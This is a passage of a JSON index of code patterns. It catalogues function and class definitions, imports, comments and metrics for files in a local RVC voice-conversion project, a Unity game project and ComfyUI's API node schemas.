        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/ipex/hijacks.py",
        "docstrings": [],
        "function_defs": [
          "def __new__(cls, orig_func, sub_func, cond_func):",
          "def __init__(self, orig_func, sub_func, cond_func):",
          "def __call__(self, *args, **kwargs):",
          "def _shutdown_workers(self):",
          "def __new__(",
          "def return_null_context(*args, **kwargs):  # pylint: disable=unused-argument",
          "def check_device(device):",
          "def return_xpu(device):",
          "def ipex_no_cuda(orig_func, *args, **kwargs):",
          "def ipex_autocast(*args, **kwargs):",
          "def torch_cat(tensor, *args, **kwargs):",
          "def interpolate(",
          "def linalg_solve(A, B, *args, **kwargs):  # pylint: disable=invalid-name",
          "def ipex_hijacks():"
        ],
        "class_defs": [
          "class CondFunc:  # pylint: disable=missing-class-docstring",
          "class DummyDataParallel("
        ],
        "imports": [
          "import contextlib",
          "import importlib",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long, unnecessary-lambda, no-else-return",
          "# Functions with dtype errors:",
          "# Diffusers Float64 (ARC GPUs doesn't support double or Float64):",
          "# Broken functions when torch.cuda.is_available is True:",
          "# Functions that make compile mad with CondFunc:"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/ipex/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import torch",
          "from .init import ipex_init",
          "from .gradscaler import gradscaler_init"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/ipex/gradscaler.py",
        "docstrings": [],
        "function_defs": [
          "def _unscale_grads_(",
          "def unscale_(self, optimizer):\n\"\"\"\nDivides (\"unscales\") the optimizer's gradient tensors by the scale factor.\n:meth:`unscale_` is optional, serving cases where you need to\n:ref:`modify or inspect gradients<working-with-unscaled-gradients>`\nbetween the backward pass(es) and :meth:`step`.\nIf :meth:`unscale_` is not called explicitly,  gradients will be unscaled  automatically during :meth:`step`.\nSimple example, using :meth:`unscale_` to enable clipping of unscaled gradients::\n...\nscaler.scale(loss).backward()",
          "def update(self, new_scale=None):\n\"\"\"\nUpdates the scale factor.\nIf any optimizer steps were skipped the scale is multiplied by ``backoff_factor``\nto reduce it. If ``growth_interval`` unskipped iterations occurred consecutively,\nthe scale is multiplied by ``growth_factor`` to increase it.\nPassing ``new_scale`` sets the new scale value manually. (``new_scale`` is not\nused directly, it's used to fill GradScaler's internal scale tensor. So if\n``new_scale`` was a tensor, later in-place changes to that tensor will not further\naffect the scale GradScaler uses internally.)",
          "def gradscaler_init():"
        ],
        "class_defs": [],
        "imports": [
          "from collections import defaultdict",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "import intel_extension_for_pytorch._C as core  # pylint: disable=import-error, unused-import"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long",
          "# To set up _amp_foreach_non_finite_check_and_unscale_, split grads by device and dtype.",
          "# There could be hundreds of grads, so we'd like to iterate through them just once.",
          "# However, we don't know their devices or dtypes in advance.",
          "# https://stackoverflow.com/questions/5029934/defaultdict-of-defaultdict",
          "# Google says mypy struggles with defaultdicts type annotations.",
          "# sync grad to master weight",
          "# is_coalesced() == False means the sparse grad has values with duplicate indices.",
          "# coalesce() deduplicates indices and adds all values that have the same index.",
          "# For scaled fp16 values, there's a good chance coalescing will cause overflow,",
          "# so we should check the coalesced _values().",
          "# -: is there a way to split by device and dtype without appending in the inner loop?",
          "# FP32 division can be imprecise for certain compile options, so we carry out the reciprocal in FP64.",
          "# Accept a new user-defined scale.",
          "# Consume shared inf/nan data collected from optimizers to update the scale.",
          "# If all found_inf tensors are on the same device as self._scale, this operation is asynchronous.",
          "# To prepare for next iteration, clear the data collected from optimizers this iteration."
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/ipex/init.py",
        "docstrings": [],
        "function_defs": [
          "def ipex_init():  # pylint: disable=too-many-statements"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import contextlib",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from .hijacks import ipex_hijacks",
          "from .attention import attention_init",
          "from .gradscaler import (",
          "from .diffusers import ipex_diffusers"
        ],
        "comments": [
          "# pylint: disable=protected-access, missing-function-docstring, line-too-long",
          "# Replace cuda with xpu:",
          "# torch.cuda.is_current_stream_capturing = torch.xpu.is_current_stream_capturing",
          "# Memory:",
          "# RNG:",
          "# AMP:",
          "# C",
          "# Fix functions with ipex:"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/dio.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):",
          "def compute_f0("
        ],
        "class_defs": [
          "class Dio(F0Predictor):"
        ],
        "imports": [
          "from typing import Any, Optional, Union",
          "import numpy as np",
          "import pyworld",
          "from .f0 import F0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/deepunet.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, x: torch.Tensor):",
          "def __init__(",
          "def __call__(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:",
          "def forward(self, x: torch.Tensor) -> Tuple[torch.Tensor, List[torch.Tensor]]:",
          "def __init__(",
          "def forward(",
          "def __init__(self, in_channels, out_channels, n_inters, n_blocks, momentum=0.01):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, stride, n_blocks=1, momentum=0.01):",
          "def forward(self, x, concat_tensor):",
          "def __init__(self, in_channels, n_decoders, stride, n_blocks, momentum=0.01):",
          "def forward(self, x: torch.Tensor, concat_tensors: List[torch.Tensor]):",
          "def __init__(",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:"
        ],
        "class_defs": [
          "class ConvBlockRes(nn.Module):",
          "class Encoder(nn.Module):",
          "class ResEncoderBlock(nn.Module):",
          "class Intermediate(nn.Module):",
          "class ResDecoderBlock(nn.Module):",
          "class Decoder(nn.Module):",
          "class DeepUnet(nn.Module):"
        ],
        "imports": [
          "from typing import List, Tuple, Union",
          "import torch",
          "import torch.nn as nn"
        ],
        "comments": [
          "# self.shortcut:Optional[nn.Module] = None"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/fcpe.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def compute_f0("
        ],
        "class_defs": [
          "class FCPE(F0Predictor):"
        ],
        "imports": [
          "from typing import Optional, Union",
          "import numpy as np",
          "import torch",
          "from .f0 import F0Predictor",
          "from torchfcpe import ("
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/crepe.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def compute_f0("
        ],
        "class_defs": [
          "class CRePE(F0Predictor):"
        ],
        "imports": [
          "from typing import Any, Optional, Union",
          "import numpy as np",
          "import torch",
          "import torchcrepe",
          "from .f0 import F0Predictor"
        ],
        "comments": [
          "# Pick a batch size that doesn't cause memory errors on your gpu",
          "# Compute pitch using device 'device'"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/f0.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def compute_f0(",
          "def _interpolate_f0(self, f0: np.ndarray):\n\"\"\"\n\u5bf9F0\u8fdb\u884c\u63d2\u503c\u5904\u7406\n\"\"\"",
          "def _resize_f0(self, x: np.ndarray, target_len: int):"
        ],
        "class_defs": [
          "class F0Predictor(object):"
        ],
        "imports": [
          "from typing import Optional, Union",
          "import torch",
          "import numpy as np"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/models.py",
        "docstrings": [],
        "function_defs": [
          "def get_rmvpe(model_path, device, is_half=True):"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import numpy as np",
          "import os"
        ],
        "comments": [
          "# Load the model using torch.load instead of torch.jit.load"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/gen.py",
        "docstrings": [],
        "function_defs": [
          "def post_process(",
          "def __init__(",
          "def calculate("
        ],
        "class_defs": [
          "class Generator(object):"
        ],
        "imports": [
          "from math import log",
          "from pathlib import Path",
          "from typing import Optional, Union, Literal, Tuple",
          "from numba import jit",
          "import numpy as np",
          "import torch",
          "from .pm import PM",
          "from .dio import Dio",
          "from .harvest import Harvest",
          "from .crepe import CRePE",
          "from .rmvpe import RMVPE",
          "from .fcpe import FCPE"
        ],
        "comments": [
          "# with open(\"test.txt\",\"w\")as f:f.write(\"\\n\".join([str(i)for i in f0.tolist()]))",
          "# with open(\"test_opt.txt\",\"w\")as f:f.write(\"\\n\".join([str(i)for i in f0.tolist()]))",
          "# use_jit=self.config.use_jit,"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 1,
        "decorators": [
          "@jit(nopython=True)"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/pm.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):",
          "def compute_f0("
        ],
        "class_defs": [
          "class PM(F0Predictor):"
        ],
        "imports": [
          "from typing import Optional",
          "import numpy as np",
          "import parselmouth",
          "from .f0 import F0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .gen import Generator"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/e2e.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, mel):",
          "def __init__(",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class E2E(nn.Module):",
          "class BiGRU(nn.Module):"
        ],
        "imports": [
          "from typing import Tuple",
          "import torch.nn as nn",
          "from .deepunet import DeepUnet"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/stft.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def __call__(",
          "def transform(",
          "def inverse(",
          "def forward("
        ],
        "class_defs": [
          "class STFT(torch.nn.Module):"
        ],
        "imports": [
          "from typing import Optional, Tuple, Union",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "from librosa.util import pad_center",
          "from scipy.signal import get_window"
        ],
        "comments": [
          "# get window and zero center pad it to filter_length",
          "# window the bases"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/rmvpe.py",
        "docstrings": [],
        "function_defs": [
          "def rmvpe_jit_export(",
          "def __init__(self, model_path, device=\"cpu\", is_half=True):",
          "def forward(self, x):",
          "def calculate(self, x):",
          "def compute_f0(",
          "def _to_local_average_cents(self, salience, threshold=0.05):",
          "def _mel2hidden(self, mel):",
          "def _decode(self, hidden, thred=0.03):"
        ],
        "class_defs": [
          "class RMVPE(nn.Module):"
        ],
        "imports": [
          "from io import BytesIO",
          "import os",
          "from typing import Any, Optional, Union",
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import onnxruntime as ort",
          "from rvc.jit import load_inputs, get_jit_model, export_jit_model, save_pickle",
          "from .mel import MelSpectrogram",
          "from .f0 import F0Predictor",
          "from .models import get_rmvpe"
        ],
        "comments": [
          "# Load the model using torch.load instead of torch.jit.load",
          "# f0 = np.array([10 * (2 ** (cent_pred / 1200)) if cent_pred else 0 for cent_pred in cents_pred])"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/mel.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward("
        ],
        "class_defs": [
          "class MelSpectrogram(torch.nn.Module):"
        ],
        "imports": [
          "from typing import Optional",
          "import torch",
          "import numpy as np",
          "from librosa.filters import mel",
          "from .stft import STFT"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/f0/harvest.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):",
          "def compute_f0("
        ],
        "class_defs": [
          "class Harvest(F0Predictor):"
        ],
        "imports": [
          "from typing import Any, Optional, Union",
          "import numpy as np",
          "import pyworld",
          "from scipy import signal",
          "from .f0 import F0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/character-pipeline/unity/CharacterGame",
    "name": "CharacterGame",
    "languages": [
      "C#"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis",
    "name": "apis",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/topaz_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ImageEnhanceRequest(BaseModel):",
          "class ImageAsyncTaskResponse(BaseModel):",
          "class ImageStatusResponse(BaseModel):",
          "class ImageDownloadResponse(BaseModel):",
          "class Resolution(BaseModel):",
          "class CreateCreateVideoRequestSource(BaseModel):",
          "class VideoFrameInterpolationFilter(BaseModel):",
          "class VideoEnhancementFilter(BaseModel):",
          "class OutputInformationVideo(BaseModel):",
          "class Overrides(BaseModel):",
          "class CreateVideoRequest(BaseModel):",
          "class CreateVideoResponse(BaseModel):",
          "class VideoAcceptResponse(BaseModel):",
          "class VideoCompleteUploadRequestPart(BaseModel):",
          "class VideoCompleteUploadRequest(BaseModel):",
          "class VideoCompleteUploadResponse(BaseModel):",
          "class VideoStatusResponseEstimates(BaseModel):",
          "class VideoStatusResponseDownloadUrl(BaseModel):",
          "class VideoStatusResponse(BaseModel):"
        ],
        "imports": [
          "from typing import Optional, Union",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/kling_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class OmniProText2VideoRequest(BaseModel):",
          "class OmniParamImage(BaseModel):",
          "class OmniParamVideo(BaseModel):",
          "class OmniProFirstLastFrameRequest(BaseModel):",
          "class OmniProReferences2VideoRequest(BaseModel):",
          "class TaskStatusVideoResult(BaseModel):",
          "class TaskStatusImageResult(BaseModel):",
          "class TaskStatusResults(BaseModel):",
          "class TaskStatusResponseData(BaseModel):",
          "class TaskStatusResponse(BaseModel):",
          "class OmniImageParamImage(BaseModel):",
          "class OmniProImageRequest(BaseModel):",
          "class TextToVideoWithAudioRequest(BaseModel):",
          "class ImageToVideoWithAudioRequest(BaseModel):",
          "class MotionControlRequest(BaseModel):"
        ],
        "imports": [
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/bfl_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class BFLOutputFormat(str, Enum):",
          "class BFLFluxExpandImageRequest(BaseModel):",
          "class BFLFluxFillImageRequest(BaseModel):",
          "class BFLFluxProGenerateRequest(BaseModel):",
          "class Flux2ProGenerateRequest(BaseModel):",
          "class BFLFluxKontextProGenerateRequest(BaseModel):",
          "class BFLFluxProUltraGenerateRequest(BaseModel):",
          "class BFLFluxProGenerateResponse(BaseModel):",
          "class BFLStatus(str, Enum):",
          "class BFLFluxStatusResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Any, Dict, Optional",
          "from pydantic import BaseModel, Field, confloat, conint"
        ],
        "comments": [
          "# image_prompt_strength: Optional[confloat(ge=0.0, le=1.0)] = Field(",
          "#     None, description='Blend between the prompt and the image prompt.'",
          "# )"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/recraft_api.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, r: int, g: int, b: int):",
          "def create_api_model(self):",
          "def __init__(self):",
          "def get_first(self):",
          "def add(self, color: RecraftColor):",
          "def create_api_model(self):",
          "def clone(self):",
          "def clone_and_merge(self, other: RecraftColorChain):",
          "def __init__(self, colors: RecraftColorChain=None, background_color: RecraftColorChain=None,",
          "def create_api_model(self):",
          "def __init__(self, style: str=None, substyle: str=None, style_id: str=None):",
          "def get_v3_substyles(style_v3: str, include_none=True) -> list[str]:"
        ],
        "class_defs": [
          "class RecraftColor:",
          "class RecraftColorChain:",
          "class RecraftControls:",
          "class RecraftStyle:",
          "class RecraftIO:",
          "class RecraftStyleV3(str, Enum):",
          "class RecraftModel(str, Enum):",
          "class RecraftImageSize(str, Enum):",
          "class RecraftColorObject(BaseModel):",
          "class RecraftControlsObject(BaseModel):",
          "class RecraftImageGenerationRequest(BaseModel):",
          "class RecraftReturnedObject(BaseModel):",
          "class RecraftImageGenerationResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field, conint, confloat"
        ],
        "comments": [
          "#any = 'any' NOTE: this does not work for some reason... why?",
          "# text_layout"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class APIKey(BaseModel):",
          "class APIKeyWithPlaintext(APIKey):",
          "class AuditLog(BaseModel):",
          "class BFLAsyncResponse(BaseModel):",
          "class BFLAsyncWebhookResponse(BaseModel):",
          "class CannyHighThreshold(RootModel[int]):",
          "class CannyLowThreshold(RootModel[int]):",
          "class Guidance(RootModel[float]):",
          "class Steps(RootModel[int]):",
          "class WebhookUrl(RootModel[AnyUrl]):",
          "class BFLFluxKontextMaxGenerateRequest(BaseModel):",
          "class BFLFluxKontextMaxGenerateResponse(BaseModel):",
          "class BFLFluxKontextProGenerateRequest(BaseModel):",
          "class BFLFluxKontextProGenerateResponse(BaseModel):",
          "class OutputFormat(str, Enum):",
          "class BFLFluxPro11GenerateRequest(BaseModel):",
          "class BFLFluxPro11GenerateResponse(BaseModel):",
          "class Bottom(RootModel[int]):",
          "class Guidance2(RootModel[float]):",
          "class Left(RootModel[int]):",
          "class Right(RootModel[int]):",
          "class Steps2(RootModel[int]):",
          "class Top(RootModel[int]):",
          "class BFLFluxProGenerateRequest(BaseModel):",
          "class BFLFluxProGenerateResponse(BaseModel):",
          "class BFLOutputFormat(str, Enum):",
          "class BFLValidationError(BaseModel):",
          "class Status(str, Enum):",
          "class ClaimMyNodeRequest(BaseModel):",
          "class ComfyNode(BaseModel):",
          "class ComfyNodeCloudBuildInfo(BaseModel):",
          "class Status1(str, Enum):",
          "class Type(str, Enum):",
          "class ComputerToolCall(BaseModel):",
          "class Environment(str, Enum):",
          "class Type1(str, Enum):",
          "class ComputerUsePreviewTool(BaseModel):",
          "class CreateAPIKeyRequest(BaseModel):",
          "class Customer(BaseModel):",
          "class CustomerStorageResourceResponse(BaseModel):",
          "class Role(str, Enum):",
          "class Type2(str, Enum):",
          "class Error(BaseModel):",
          "class ErrorResponse(BaseModel):",
          "class Type3(str, Enum):",
          "class FileSearchTool(BaseModel):",
          "class Result(BaseModel):",
          "class Status2(str, Enum):",
          "class Type4(str, Enum):",
          "class FileSearchToolCall(BaseModel):",
          "class Type5(str, Enum):",
          "class FunctionTool(BaseModel):",
          "class Status3(str, Enum):",
          "class Type6(str, Enum):",
          "class FunctionToolCall(BaseModel):",
          "class GeminiCitation(BaseModel):",
          "class GeminiCitationMetadata(BaseModel):",
          "class Role1(str, Enum):",
          "class GeminiFunctionDeclaration(BaseModel):",
          "class GeminiGenerationConfig(BaseModel):",
          "class GeminiMimeType(str, Enum):",
          "class GeminiOffset(BaseModel):",
          "class GeminiSafetyCategory(str, Enum):",
          "class Probability(str, Enum):",
          "class GeminiSafetyRating(BaseModel):",
          "class GeminiSafetyThreshold(str, Enum):",
          "class GeminiTextPart(BaseModel):",
          "class GeminiTool(BaseModel):",
          "class GeminiVideoMetadata(BaseModel):",
          "class GitCommitSummary(BaseModel):",
          "class GithubEnterprise(BaseModel):",
          "class RepositorySelection(str, Enum):",
          "class GithubOrganization(BaseModel):",
          "class State(str, Enum):",
          "class Action(str, Enum):",
          "class Type7(str, Enum):",
          "class GithubUser(BaseModel):",
          "class IdeogramColorPalette1(BaseModel):",
          "class Member(BaseModel):",
          "class IdeogramColorPalette2(BaseModel):",
          "class IdeogramColorPalette(",
          "class ImageRequest(BaseModel):",
          "class IdeogramGenerateRequest(BaseModel):",
          "class Datum(BaseModel):",
          "class IdeogramGenerateResponse(BaseModel):",
          "class StyleCode(RootModel[str]):",
          "class Datum1(BaseModel):",
          "class IdeogramV3IdeogramResponse(BaseModel):",
          "class RenderingSpeed1(str, Enum):",
          "class IdeogramV3ReframeRequest(BaseModel):",
          "class MagicPrompt(str, Enum):",
          "class StyleType(str, Enum):",
          "class IdeogramV3RemixRequest(BaseModel):",
          "class IdeogramV3ReplaceBackgroundRequest(BaseModel):",
          "class ColorPalette(BaseModel):",
          "class MagicPrompt2(str, Enum):",
          "class StyleType1(str, Enum):",
          "class ImagenImageGenerationInstance(BaseModel):",
          "class AspectRatio(str, Enum):",
          "class PersonGeneration(str, Enum):",
          "class SafetySetting(str, Enum):",
          "class ImagenImagePrediction(BaseModel):",
          "class MimeType(str, Enum):",
          "class ImagenOutputOptions(BaseModel):",
          "class Includable(str, Enum):",
          "class Type8(str, Enum):",
          "class InputFileContent(BaseModel):",
          "class Detail(str, Enum):",
          "class Type9(str, Enum):",
          "class InputImageContent(BaseModel):",
          "class Role3(str, Enum):",
          "class Type10(str, Enum):",
          "class Type11(str, Enum):",
          "class InputTextContent(BaseModel):",
          "class KlingAudioUploadType(str, Enum):",
          "class KlingCameraConfig(BaseModel):",
          "class KlingCameraControlType(str, Enum):",
          "class KlingCharacterEffectModelName(str, Enum):",
          "class KlingDualCharacterEffectsScene(str, Enum):",
          "class KlingDualCharacterImages(RootModel[List[str]]):",
          "class KlingErrorResponse(BaseModel):",
          "class Trajectory(BaseModel):",
          "class DynamicMask(BaseModel):",
          "class TaskInfo(BaseModel):",
          "class KlingImageGenAspectRatio(str, Enum):",
          "class KlingImageGenImageReferenceType(str, Enum):",
          "class KlingImageGenModelName(str, Enum):",
          "class KlingImageGenerationsRequest(BaseModel):",
          "class KlingImageResult(BaseModel):",
          "class KlingLipSyncMode(str, Enum):",
          "class KlingLipSyncVoiceLanguage(str, Enum):",
          "class ResourcePackType(str, Enum):",
          "class Status5(str, Enum):",
          "class ResourcePackSubscribeInfo(BaseModel):",
          "class Data3(BaseModel):",
          "class KlingResourcePackageResponse(BaseModel):",
          "class KlingSingleImageEffectDuration(str, Enum):",
          "class KlingSingleImageEffectModelName(str, Enum):",
          "class KlingSingleImageEffectsScene(str, Enum):",
          "class KlingTaskStatus(str, Enum):",
          "class KlingTextToVideoModelName(str, Enum):",
          "class KlingVideoGenAspectRatio(str, Enum):",
          "class KlingVideoGenCfgScale(RootModel[float]):",
          "class KlingVideoGenDuration(str, Enum):",
          "class KlingVideoGenMode(str, Enum):",
          "class KlingVideoGenModelName(str, Enum):",
          "class KlingVideoResult(BaseModel):",
          "class KlingVirtualTryOnModelName(str, Enum):",
          "class KlingVirtualTryOnRequest(BaseModel):",
          "class TaskResult6(BaseModel):",
          "class Data7(BaseModel):",
          "class KlingVirtualTryOnResponse(BaseModel):",
          "class LumaAspectRatio(str, Enum):",
          "class LumaAssets(BaseModel):",
          "class GenerationType(str, Enum):",
          "class LumaAudioGenerationRequest(BaseModel):",
          "class LumaError(BaseModel):",
          "class Type12(str, Enum):",
          "class LumaGenerationReference(BaseModel):",
          "class GenerationType1(str, Enum):",
          "class LumaGenerationType(str, Enum):",
          "class GenerationType2(str, Enum):",
          "class LumaImageIdentity(BaseModel):",
          "class LumaImageModel(str, Enum):",
          "class LumaImageRef(BaseModel):",
          "class Type13(str, Enum):",
          "class LumaImageReference(BaseModel):",
          "class LumaKeyframe(RootModel[Union[LumaGenerationReference, LumaImageReference]]):",
          "class LumaKeyframes(BaseModel):",
          "class LumaModifyImageRef(BaseModel):",
          "class LumaState(str, Enum):",
          "class GenerationType3(str, Enum):",
          "class LumaVideoModel(str, Enum):",
          "class LumaVideoModelOutputDuration1(str, Enum):",
          "class LumaVideoModelOutputDuration(",
          "class LumaVideoModelOutputResolution1(str, Enum):",
          "class LumaVideoModelOutputResolution(",
          "class MachineStats(BaseModel):",
          "class MinimaxBaseResponse(BaseModel):",
          "class File(BaseModel):",
          "class MinimaxFileRetrieveResponse(BaseModel):",
          "class Status6(str, Enum):",
          "class MinimaxTaskResultResponse(BaseModel):",
          "class MiniMaxModel(str, Enum):",
          "class SubjectReferenceItem(BaseModel):",
          "class MinimaxVideoGenerationRequest(BaseModel):",
          "class MinimaxVideoGenerationResponse(BaseModel):",
          "class Modality(str, Enum):",
          "class ModalityTokenCount(BaseModel):",
          "class Truncation(str, Enum):",
          "class ModelResponseProperties(BaseModel):",
          "class Keyframes(BaseModel):",
          "class MoonvalleyPromptResponse(BaseModel):",
          "class MoonvalleyTextToVideoInferenceParams(BaseModel):",
          "class MoonvalleyTextToVideoRequest(BaseModel):",
          "class MoonvalleyUploadFileRequest(BaseModel):",
          "class MoonvalleyUploadFileResponse(BaseModel):",
          "class MoonvalleyVideoToVideoInferenceParams(BaseModel):",
          "class ControlType(str, Enum):",
          "class MoonvalleyVideoToVideoRequest(BaseModel):",
          "class NodeStatus(str, Enum):",
          "class NodeVersionIdentifier(BaseModel):",
          "class NodeVersionStatus(str, Enum):",
          "class NodeVersionUpdateRequest(BaseModel):",
          "class Moderation(str, Enum):",
          "class OutputFormat1(str, Enum):",
          "class OpenAIImageEditRequest(BaseModel):",
          "class Background(str, Enum):",
          "class Quality(str, Enum):",
          "class ResponseFormat(str, Enum):",
          "class Style(str, Enum):",
          "class OpenAIImageGenerationRequest(BaseModel):",
          "class Datum2(BaseModel):",
          "class InputTokensDetails(BaseModel):",
          "class Usage(BaseModel):",
          "class OpenAIImageGenerationResponse(BaseModel):",
          "class OpenAIModels(str, Enum):",
          "class Reason(str, Enum):",
          "class IncompleteDetails(BaseModel):",
          "class Object(str, Enum):",
          "class Status7(str, Enum):",
          "class Type14(str, Enum):",
          "class OutputAudioContent(BaseModel):",
          "class Role4(str, Enum):",
          "class Type15(str, Enum):",
          "class Type16(str, Enum):",
          "class OutputTextContent(BaseModel):",
          "class PersonalAccessToken(BaseModel):",
          "class AspectRatio1(RootModel[float]):",
          "class IngredientsMode(str, Enum):",
          "class PikaBodyGenerate22C2vGenerate22PikascenesPost(BaseModel):",
          "class PikaBodyGeneratePikadditionsGeneratePikadditionsPost(BaseModel):",
          "class PikaBodyGeneratePikaswapsGeneratePikaswapsPost(BaseModel):",
          "class PikaDurationEnum(int, Enum):",
          "class PikaGenerateResponse(BaseModel):",
